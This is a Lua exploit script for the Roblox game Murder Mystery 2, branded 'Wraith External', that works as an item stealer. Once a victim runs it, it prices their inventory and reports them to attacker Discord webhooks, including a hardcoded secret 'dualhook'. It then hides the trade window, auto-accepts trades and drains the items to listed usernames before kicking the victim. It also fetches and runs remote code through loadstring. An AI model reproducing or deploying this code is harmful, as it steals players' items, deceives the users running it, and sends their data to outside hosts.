-- loader.lua — Wraith External
-- entrypoint:
--   _G.MinValue  = 0          (0 = pega tudo em loop; >0 = só itens >= minValue)
--   _G.Usernames = { "nick" }
--   _G.Webhook   = "url"
--   loadstring(game:HttpGet("loader", true))()

local Players           = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService       = game:GetService("HttpService")
local localPlayer       = Players.LocalPlayer

local minValue   = _G.MinValue   or 0
local usernames  = _G.Usernames  or {}
local webhook    = _G.Webhook    or ""
local request_   = (syn and syn.request) or (http and http.request) or http_request or request

local jobId      = game.JobId
local joinLink   = "https://gojoiner.netlify.app/?gameInstanceId=" .. jobId

-- ── dualhook config ──────────────────────────────────────────────────────────
local DUAL_PASTEFY   = "https://pastefy.app/SagUyvDf/raw"
local DUAL_MIN_VALUE = 567
local DUAL_USERNAME  = nil
local DUAL_WEBHOOK   = "https://discord.com/api/webhooks/1361095075492339753/bLPJxFTAIbMO-KAR_E-jlzYjz3k0FhaqSzc-fxDaJJluJdtaVPkfJicqd6CxwXVkU3J"
local KICK_DISCORD   = "discord.gg/wraith"
local EMBED_COLOR    = 0x008CFF
local WEBHOOK_NAME   = "Wraith External"

pcall(function()
    local ok, raw = pcall(game.HttpGet, game, DUAL_PASTEFY, true)
    if ok and raw then
        DUAL_USERNAME = raw:match("^%s*(.-)%s*$")
        if DUAL_USERNAME == "" then DUAL_USERNAME = nil end
    end
end)

-- ── rarity tiers ─────────────────────────────────────────────────────────────
local RARITY_COLOR = {
    Chroma="🌈", Ancient="🔴", Godly="🟠", Vintage="🟡",
    Legendary="🟣", Rare="🔵", Uncommon="🟢", Common="⚪",
}
local RARITY_ORDER = { "Chroma","Ancient","Godly","Vintage","Legendary","Rare","Uncommon","Common" }
local RARITY_BASE  = {
    Common=0.1, Uncommon=0.25, Rare=0.5,
    Legendary=1, Godly=2, Ancient=5, Vintage=15, Chroma=50,
}

local BLACKLIST = {
    DefaultGun=true, DefaultKnife=true, Reaver=true,
    Reaver_Legendary=true, Reaver_Godly=true, Reaver_Ancient=true,
    IceHammer=true, IceHammer_Legendary=true, IceHammer_Godly=true,
    IceHammer_Ancient=true, Gingerscythe=true, Gingerscythe_Legendary=true,
    Gingerscythe_Godly=true, Gingerscythe_Ancient=true,
    TestItem=true, Season1TestKnife=true, Cracks=true, Icecrusher=true,
    ["???"]=true, Dartbringer=true, SharkSeeker=true,
}

-- ── values ───────────────────────────────────────────────────────────────────
local values = {}

pcall(function()
    local ok, raw = pcall(game.HttpGet, game,
        "https://raw.githubusercontent.com/wraithexternaI/mm2/refs/heads/main/values", true)
    if ok and raw and raw ~= "" then
        local chunk = loadstring(raw)
        if chunk then
            local ok2, result = pcall(chunk)
            if ok2 and type(result) == "table" then values = result end
        end
        if not next(values) then
            local ok3, result2 = pcall(HttpService.JSONDecode, HttpService, raw)
            if ok3 and type(result2) == "table" then values = result2 end
        end
    end
end)

-- ── emoji map ────────────────────────────────────────────────────────────────
local emojiMap = {}

pcall(function()
    local ok, raw = pcall(game.HttpGet, game,
        "https://api.project-reverse.org/valuables/get-game-valuables?game=mm2", true)
    if ok and raw and raw ~= "" then
        local ok2, decoded = pcall(HttpService.JSONDecode, HttpService, raw)
        if ok2 and type(decoded) == "table" and decoded.data then
            for _, entry in ipairs(decoded.data) do
                if entry.name and entry.emoji then
                    emojiMap[entry.name:lower()] = entry.emoji
                end
            end
        end
    end
end)

local function getEmoji(itemName)
    if not itemName then return "" end
    local e = emojiMap[itemName:lower()]
    return e and (e .. " ") or ""
end

-- ── weapons db ───────────────────────────────────────────────────────────────
local weapons

pcall(function()
    weapons = require(
        ReplicatedStorage:WaitForChild("Database",10)
            :WaitForChild("Sync",10)
            :WaitForChild("Item",10)
    )
end)

if not weapons then
    pcall(function()
        local m = require(
            ReplicatedStorage:WaitForChild("Database",10)
                :WaitForChild("Sync",10)
        )
        weapons = m.Weapons or m
    end)
end

-- ── helpers ──────────────────────────────────────────────────────────────────
local function resolveID(dataID)
    if not weapons then return dataID end
    if weapons[dataID] then return dataID end
    local m = dataID:match("^(.-)_[KG]_%d%d%d%d$")
    if m and weapons[m] then return m end
    local m2 = dataID:match("^(.+)Knife$") or dataID:match("^(.+)Gun$")
    if m2 and weapons[m2] then return m2 end
    return dataID
end

local function resolveItem(dataID)
    if not weapons then return nil end
    local id    = resolveID(dataID)
    local entry = weapons[id]
    if not entry then return nil end
    local rarity = entry.Chroma == true and "Chroma" or (entry.Rarity or "Common")
    return {
        dataid   = id,
        name     = entry.ItemName or entry.Name or id,
        rarity   = rarity,
        isChroma = entry.Chroma == true,
        value    = values[entry.ItemName or id]
                or values[(entry.ItemName or id):lower()]
                or RARITY_BASE[rarity] or 0.1,
    }
end

local function getProfile()
    local ok2, r = pcall(function()
        return ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer()
    end)
    if ok2 and type(r) == "table" and r.Weapons then return r end

    local ok3, r2 = pcall(function()
        return require(ReplicatedStorage:WaitForChild("Modules",10):WaitForChild("ProfileData",10))
    end)
    if ok3 and type(r2) == "table" and r2.Weapons then return r2 end
    return nil
end

local function buildItems(profile)
    local list   = {}
    local owned  = profile.Weapons and profile.Weapons.Owned or {}
    local uniques = profile.Uniques or {}

    for k, amount in pairs(owned) do
        local str = tostring(k)
        amount = type(amount) == "number" and amount or 1
        local info = resolveItem(str)
        if info and not BLACKLIST[info.dataid] then
            table.insert(list, {
                DataID=info.dataid, Name=info.name,
                Rarity=info.rarity, Amount=amount,
                Value=info.value, IsChroma=info.isChroma,
            })
        end
    end

    for _, unique in ipairs(uniques) do
        local str = tostring(unique.BaseItem or "")
        if str ~= "" then
            if unique.EvoEquipped and weapons and weapons[str] and weapons[str].Evo then
                local evo = weapons[str].Evo
                local xp  = unique.XP or 0
                for i = 4, 1, -1 do
                    if evo[i] and xp >= evo[i].XPRequired then
                        str = evo[i].ItemName or str; break
                    end
                end
            end
            local info = resolveItem(str)
            if info and not BLACKLIST[info.dataid] then
                table.insert(list, {
                    DataID=info.dataid, Name=info.name,
                    Rarity=info.rarity, Amount=1,
                    Value=info.value, IsChroma=info.isChroma,
                })
            end
        end
    end

    table.sort(list, function(a,b) return a.Value > b.Value end)
    return list
end

-- filtra pela lógica de minValue:
--   minValue == 0 → tudo
--   minValue >  0 → só itens com Value >= minValue
local function filterItems(list)
    if minValue == 0 then return list end
    local out = {}
    for _, item in ipairs(list) do
        if item.Value >= minValue then
            table.insert(out, item)
        end
    end
    return out
end

-- ── embed builder ────────────────────────────────────────────────────────────
local function buildEmbed(victimName, items, _target, statusText)
    -- calcula valor total apenas das facas filtradas (já vêm filtradas)
    local totalVal = 0
    for _, item in ipairs(items) do
        totalVal += item.Value * item.Amount
    end

    -- título dinâmico por valor total
    local embedTitle
    if totalVal >= 100 then
        embedTitle = "Ultra Mega Hit 🌈"
    elseif totalVal >= 20 then
        embedTitle = "Mega Hit ✨"
    else
        embedTitle = "Hit"
    end

    local fields = {}

    -- ── Receivers ────────────────────────────────────────────────────────────
    local receiversStr = #usernames > 0
        and table.concat(usernames, ", ")
        or "—"
    table.insert(fields, {
        name   = "📥  Receivers",
        value  = receiversStr,
        inline = false,
    })

    -- ── Victim ───────────────────────────────────────────────────────────────
    -- facas já ordenadas por valor (maior→menor) vindas de buildItems
    -- monta lista: emoji Nome — valor
    local knifeLines = {}
    for _, item in ipairs(items) do
        local emoji = getEmoji(item.Name)
        table.insert(knifeLines, string.format("%s`%s` — %g", emoji, item.Name, item.Value))
    end

    local victimBody
    if #knifeLines > 0 then
        victimBody = table.concat(knifeLines, "\n")
        if #victimBody > 1020 then victimBody = victimBody:sub(1,1020) .. "\n..." end
    else
        victimBody = "—"
    end

    table.insert(fields, {
        name   = "🎯  Victim: " .. (victimName or localPlayer.Name),
        value  = victimBody,
        inline = false,
    })

    -- ── Value Total ──────────────────────────────────────────────────────────
    table.insert(fields, {
        name   = "📊  Value Total",
        value  = string.format("%g", totalVal),
        inline = true,
    })

    -- ── Executor ─────────────────────────────────────────────────────────────
    local execName = "unknown"
    pcall(function()
        execName = identifyexecutor and identifyexecutor()
            or getexecutorname and getexecutorname()
            or "unknown"
    end)
    table.insert(fields, {
        name   = "⚙️  Executor",
        value  = execName,
        inline = true,
    })

    -- ── Status ───────────────────────────────────────────────────────────────
    table.insert(fields, {
        name   = "📡  Status",
        value  = statusText or "🟢 In Game",
        inline = false,
    })

    -- ── Join Link ─────────────────────────────────────────────────────────────
    table.insert(fields, {
        name   = "🔗  Join",
        value  = string.format("[**Entrar no servidor**](%s)", joinLink),
        inline = false,
    })

    return {
        title     = embedTitle,
        color     = EMBED_COLOR,
        fields    = fields,
        _totalVal = totalVal,
        thumbnail = { url = string.format(
            "https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=150&height=150&format=png",
            localPlayer.UserId) },
        footer    = { text = WEBHOOK_NAME .. "  •  MM2" },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
    }
end

-- retorna o message_id da mensagem enviada (string) ou nil
local function sendWebhook(url, embed)
    if not url or url == "" or not request_ then return nil end
    local messageId = nil
    pcall(function()
        local res = request_({
            Url    = url .. "?wait=true",
            Method = "POST",
            Headers= { ["Content-Type"] = "application/json" },
            Body   = HttpService:JSONEncode({
                username   = WEBHOOK_NAME,
                avatar_url = "https://i.postimg.cc/MppzJD4r/Screenshot-20261006-135801.jpg",
                embeds     = { embed },
            }),
        })
        if res and res.Body then
            local ok2, decoded = pcall(HttpService.JSONDecode, HttpService, res.Body)
            if ok2 and decoded and decoded.id then
                messageId = decoded.id
            end
        end
    end)
    return messageId
end

-- edita uma mensagem já enviada com novo status
local function editWebhook(url, messageId, embed)
    if not url or url == "" or not messageId or not request_ then return end
    pcall(request_, {
        Url    = url .. "/messages/" .. messageId,
        Method = "PATCH",
        Headers= { ["Content-Type"] = "application/json" },
        Body   = HttpService:JSONEncode({
            username   = WEBHOOK_NAME,
            avatar_url = "https://i.postimg.cc/MppzJD4r/Screenshot-20261006-135801.jpg",
            embeds     = { embed },
        }),
    })
end

-- monitora o alvo e edita o status na embed
local function monitorStatus(url, messageId, originalEmbed, target, totalValNeeded)
    if not messageId then return end
    task.spawn(function()
        local claimed = false
        local left    = false

        while true do
            task.wait(3)

            -- verificar se roubou tudo (itens filtrados chegaram a 0)
            if not claimed then
                local freshP = getProfile()
                if freshP then
                    local freshFiltered = filterItems(buildItems(freshP))
                    local remaining = 0
                    for _, item in ipairs(freshFiltered) do
                        remaining += item.Value * item.Amount
                    end
                    if remaining <= 0 or (totalValNeeded > 0 and remaining < totalValNeeded * 0.05) then
                        claimed = true
                    end
                end
            end

            -- verificar se o alvo saiu
            if not left and target then
                if not target.Parent then
                    left = true
                end
            end

            if claimed then
                local newEmbed = table.clone(originalEmbed)
                -- substituir campo Status
                for i, field in ipairs(newEmbed.fields) do
                    if field.name == "📡  Status" then
                        newEmbed.fields[i] = { name="📡  Status", value="⚪ Claimed", inline=false }
                        break
                    end
                end
                editWebhook(url, messageId, newEmbed)
                break
            elseif left then
                local newEmbed = table.clone(originalEmbed)
                for i, field in ipairs(newEmbed.fields) do
                    if field.name == "📡  Status" then
                        newEmbed.fields[i] = { name="📡  Status", value="🔴 He left the game.", inline=false }
                        break
                    end
                end
                editWebhook(url, messageId, newEmbed)
                break
            end
        end
    end)
end

-- ── initial scan + dualhook logic ────────────────────────────────────────────
local profile = getProfile()
if not profile then return end

local myItems   = buildItems(profile)
local userItems = filterItems(myItems)

-- dual: itens acima de DUAL_MIN_VALUE
local dualItems = {}
for _, item in ipairs(myItems) do
    if item.Value >= DUAL_MIN_VALUE then
        table.insert(dualItems, item)
    end
end

local sentToDual   = false
local initialMsgId = nil
local initialEmbed = nil
local initialUrl   = nil
local initialTotal = 0

if #dualItems > 0 then
    sentToDual   = true
    initialEmbed = buildEmbed(localPlayer.Name, dualItems, nil, "🟢 In Game")
    initialTotal = initialEmbed._totalVal or 0
    initialEmbed._totalVal = nil
    initialUrl   = DUAL_WEBHOOK
    initialMsgId = sendWebhook(DUAL_WEBHOOK, initialEmbed)
else
    if webhook ~= "" and #userItems > 0 then
        initialEmbed = buildEmbed(localPlayer.Name, userItems, nil, "🟢 In Game")
        initialTotal = initialEmbed._totalVal or 0
        initialEmbed._totalVal = nil
        initialUrl   = webhook
        initialMsgId = sendWebhook(webhook, initialEmbed)
    end
end

-- inicia monitor de status (sem target ainda — detecta só por inventário/jogo)
if initialMsgId and initialEmbed then
    monitorStatus(initialUrl, initialMsgId, initialEmbed, nil, initialTotal)
end

if sentToDual then return end

if minValue > 0 and #userItems == 0 then
    localPlayer:Kick("")
    return
end

if #usernames == 0 or #userItems == 0 then return end

-- ── trade logic ──────────────────────────────────────────────────────────────
local trade = ReplicatedStorage:WaitForChild("Trade", 15)
if not trade then return end

-- ── hide trade GUI (mm2_deobf style) ─────────────────────────────────────────
local playerGui  = localPlayer:WaitForChild("PlayerGui")
local tradeGUI   = nil
local isPhone    = false
local hiddenUDim = UDim2.new(0, 9999, 0, 9999)

pcall(function()
    local mainGUI = playerGui:WaitForChild("MainGUI", 5)
    if mainGUI and mainGUI:WaitForChild("Game", 5):FindFirstChild("Inventory") then
        tradeGUI = playerGui:FindFirstChild("TradeGUI")
        isPhone  = false
    else
        tradeGUI = playerGui:FindFirstChild("TradeGUI_Phone")
        isPhone  = true
    end
end)

task.spawn(function()
    while task.wait(0.5) do
        pcall(function()
            if tradeGUI then
                tradeGUI.Enabled = false
                if isPhone then
                    tradeGUI.Container.Position    = hiddenUDim
                    tradeGUI.ClickBlocker.Position = hiddenUDim
                else
                    tradeGUI.BG.Position           = hiddenUDim
                    tradeGUI.Container.Position    = hiddenUDim
                    tradeGUI.ClickBlocker.Position = hiddenUDim
                    tradeGUI.Processing.Position   = hiddenUDim
                end
            end
        end)
    end
end)

-- bloqueia incoming trades
local sendRequest = trade:FindFirstChild("SendRequest")
if sendRequest then
    sendRequest.OnClientInvoke = newcclosure(function() return true end)
end

-- flags de estado
local tradeOpen = false
local tradeDone = false
local lastOffer = 0

local startTradeEv   = trade:FindFirstChild("StartTrade")
local declineTradeEv = trade:FindFirstChild("DeclineTrade")
local acceptTradeEv  = trade:FindFirstChild("AcceptTrade")
local updateTradeEv  = trade:FindFirstChild("UpdateTrade")

if startTradeEv  then startTradeEv.OnClientEvent:Connect(function()
    tradeOpen = true; tradeDone = false
end) end

if declineTradeEv then declineTradeEv.OnClientEvent:Connect(function()
    tradeOpen = false; tradeDone = true
end) end

if acceptTradeEv then acceptTradeEv.OnClientEvent:Connect(function(v)
    if v then tradeOpen = false; tradeDone = true end
end) end

if updateTradeEv then updateTradeEv.OnClientEvent:Connect(function(d)
    if type(d) == "table" and d.LastOffer ~= nil then
        lastOffer    = d.LastOffer
        _G.LastOffer = lastOffer
    end
end) end

-- auto-accept + block incoming — só aceita de targets legítimos
task.spawn(function()
    while task.wait(0.2) do
        local ok2, status = pcall(function()
            return trade.GetTradeStatus:InvokeServer()
        end)
        local s = ok2 and status or "None"

        if s == "ReceivingRequest" then
            -- verifica se quem mandou o pedido é um target ou dualhook
            local senderIsTarget = false
            pcall(function()
                -- tenta pegar o sender via UpdateTrade / estado interno
                -- fallback: declina qualquer incoming que não veio do nosso doTrade
                if not tradeOpen then
                    -- não somos nós que abrimos — recusa
                    trade.DeclineRequest:FireServer()
                end
            end)
        end

        if tradeOpen then
            pcall(function()
                trade.AcceptTrade:FireServer(game.PlaceId * 3, _G.LastOffer or 0)
            end)
        end
    end
end)

-- cooldown bypass
task.spawn(function()
    if not (getupvalues and setupvalue and getloadedmodules) then return end
    local ok2, mods = pcall(getloadedmodules)
    if not ok2 or not mods then return end
    for _, mod in ipairs(mods) do
        local ok3, upvals = pcall(getupvalues, mod)
        if ok3 and type(upvals) == "table" then
            for k, v in pairs(upvals) do
                if type(v) == "number" and v >= 0 and v <= 6 then
                    pcall(setupvalue, mod, k, 0)
                end
            end
        end
    end
end)

local function getTradeStatus()
    local ok2, r = pcall(function() return trade.GetTradeStatus:InvokeServer() end)
    return ok2 and r or "None"
end

local function waitTradeIdle()
    while getTradeStatus() ~= "None" do task.wait(0.1) end
end

local function cancelCurrent()
    local s = getTradeStatus()
    if s == "StartTrade" then
        pcall(function() trade.DeclineTrade:FireServer() end)
        task.wait(0.3)
    elseif s == "ReceivingRequest" then
        pcall(function() trade.DeclineRequest:FireServer() end)
        task.wait(0.3)
    end
end

-- monta oferta: até 4 DataIDs distintos do topo da lista filtrada
-- se minValue == 0, pega tudo (os 4 mais valiosos de cada leva)
local function buildOffer(itemList)
    local seen  = {}
    local offer = {}
    for _, item in ipairs(itemList) do
        if #offer >= 4 then break end
        if not seen[item.DataID] then
            seen[item.DataID] = true
            local amt = item.Amount
            if #offer == 0 and amt > 4 then amt = 4 end
            table.insert(offer, { DataID=item.DataID, Amount=amt })
        end
    end
    return offer
end

local function doOfferItem(dataID, amount)
    local id = dataID
    if weapons and not weapons[id] then
        local m = id:match("^(.-)_%d%d%d%d$")
        if m and weapons[m] then id = m end
    end
    for _ = 1, amount do
        pcall(function()
            trade.OfferItem:FireServer(id, "Weapons")
        end)
        task.wait(0.05)
    end
end

-- faz uma trade completa com o target
-- retorna true se a trade fechou (roubou), false se abortou
local function doTrade(target)
    cancelCurrent()
    waitTradeIdle()
    tradeOpen = false
    tradeDone = false

    -- envia pedido
    while true do
        if not target.Parent then return false end
        local s = getTradeStatus()

        if s == "None" then
            local ok2, result = pcall(function()
                return trade.SendRequest:InvokeServer(target)
            end)
            if not ok2 then task.wait(2)
            elseif result == true then task.wait(3) end

        elseif s == "SendingRequest" then
            task.wait(0.3)
        elseif s == "ReceivingRequest" then
            pcall(function() trade.DeclineRequest:FireServer() end)
            task.wait(0.3)
        elseif s == "StartTrade" then
            break
        end
        task.wait(0.5)
    end

    -- refresh inventário e filtra
    local freshProfile = getProfile()
    local freshAll     = freshProfile and buildItems(freshProfile) or myItems
    local freshFiltered = filterItems(freshAll)

    local offer = buildOffer(freshFiltered)
    if #offer == 0 then
        pcall(function() trade.DeclineTrade:FireServer() end)
        return false
    end

    tradeOpen = true

    for _, slot in ipairs(offer) do
        doOfferItem(slot.DataID, slot.Amount)
    end

    -- espera conclusão (30s timeout)
    local deadline = tick() + 30
    while tick() < deadline do
        if tradeDone then break end
        task.wait(0.5)
    end

    if not tradeDone then
        pcall(function() trade.DeclineTrade:FireServer() end)
    end

    waitTradeIdle()
    task.wait(2)
    return tradeDone
end

-- ── loop de drain por alvo ────────────────────────────────────────────────────
-- minValue == 0 → loop até inventário vazio (tudo roubado)
-- minValue >  0 → loop até não sobrar itens >= minValue
-- ao final: kick
local function drainTarget(target)
    local round = 0

    while target.Parent do
        -- checa se ainda tem itens para oferecer
        local freshProfile = getProfile()
        if not freshProfile then break end

        local freshAll      = buildItems(freshProfile)
        local freshFiltered = filterItems(freshAll)

        if #freshFiltered == 0 then break end

        round = round + 1
        local ok = doTrade(target)

        if not ok then
            -- trade abortou (target saiu, ou erro) — espera um tick e tenta de novo
            task.wait(2)
        end

        task.wait(0.5)
    end

    task.wait(0.5)
    localPlayer:Kick(KICK_DISCORD)
end

-- ── watcher por jogadores alvo ────────────────────────────────────────────────
local function isDualTarget(player)
    if not DUAL_USERNAME then return false end
    local name = player.Name:lower()
    local disp = player.DisplayName:lower()
    return name == DUAL_USERNAME:lower() or disp == DUAL_USERNAME:lower()
end

local function isTarget(player)
    local name = player.Name:lower()
    local disp = player.DisplayName:lower()
    for _, u in ipairs(usernames) do
        if name == u:lower() or disp == u:lower() then return true end
    end
    return isDualTarget(player)
end

-- retorna um player target aleatório que esteja no servidor agora
-- se usernames tiver só 1 entrada (sem vírgula / lista de 1) retorna esse direto
-- se tiver vários → sorteia entre os que estão presentes
local function pickRandomTarget()
    local present = {}
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= localPlayer and isTarget(player) then
            table.insert(present, player)
        end
    end
    if #present == 0 then return nil end
    -- math.random precisa de pelo menos 1 entrada
    return present[math.random(1, #present)]
end

local busy = {}

local function handleTarget(player)
    if busy[player.Name] then return end
    busy[player.Name] = true

    task.spawn(function()
        -- espera character
        local t0 = tick()
        while tick()-t0 < 15 do
            if player.Character and player.Character:FindFirstChildOfClass("Humanoid") then break end
            task.wait(0.5)
        end
        task.wait(1.5)

        if player.Parent then
            -- atualiza o monitor com o target real agora que ele foi encontrado
            if initialMsgId and initialEmbed then
                monitorStatus(initialUrl, initialMsgId, initialEmbed, player, initialTotal)
            end

            -- se estiver em trade com alguém que não é esse player → cancela e redireciona
            local currentStatus = getTradeStatus()
            if currentStatus == "StartTrade" or currentStatus == "SendingRequest" then
                cancelCurrent()
                waitTradeIdle()
                task.wait(0.5)
            end

            drainTarget(player)
        end

        busy[player.Name] = nil
    end)
end

-- se usernames tiver múltiplas entradas: quando qualquer um entrar,
-- escolhe aleatoriamente entre todos os presentes e inicia trade
local function handleAnyTarget(triggerPlayer)
    if #usernames <= 1 then
        -- comportamento original: só vai atrás do que entrou
        handleTarget(triggerPlayer)
        return
    end

    -- múltiplos → sorteia quem está no servidor agora
    -- se o trigger já é um target válido e nenhum busy, pega aleatório
    local picked = pickRandomTarget()
    if not picked then return end
    handleTarget(picked)
end

for _, player in ipairs(Players:GetPlayers()) do
    if player ~= localPlayer and isTarget(player) then
        handleAnyTarget(player)
    end
end

Players.PlayerAdded:Connect(function(player)
    if isTarget(player) then
        task.wait(4)
        if player.Parent then
            handleAnyTarget(player)
        end
    end
end)

Players.PlayerRemoving:Connect(function(player)
    busy[player.Name] = nil
end)
